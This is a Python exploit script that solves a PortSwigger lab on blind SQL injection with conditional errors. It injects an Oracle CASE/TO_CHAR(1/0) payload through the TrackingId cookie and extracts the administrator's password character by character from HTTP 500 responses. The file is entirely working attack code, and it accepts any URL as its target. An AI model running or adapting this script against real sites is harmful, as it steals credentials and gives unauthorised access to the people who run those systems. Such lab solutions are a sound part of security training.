import argparse
import requests
import string

#https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors

def main(url):
    admin_password = ''
    password_chars = string.ascii_lowercase + string.digits + '~!@#$%^&*()+-/'
    for i in range(1, 21):
        found_char = None
        for j in password_chars:
            payload = f"'||(SELECT+CASE+WHEN+SUBSTR(password,{i},1)='{j}'+THEN+TO_CHAR(1/0)+ELSE+''+END+FROM+users+WHERE+username='administrator')||'"
            cookies = {"TrackingId": payload}
            response = requests.get(url, cookies=cookies)
            if response.status_code == 500:
                found_char = j
                break
            
        if found_char:
            admin_password += found_char
            print(f"{i}, character {found_char}")

    print('Administrator password: ' + admin_password)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Blind SQL Injection Exploit Script')
    parser.add_argument('-u', '--url', help='URL argument')
    args = parser.parse_args()

    if args.url:
        main(args.url)
    else:
        print("Please provide a URL using the -u or --url option.")
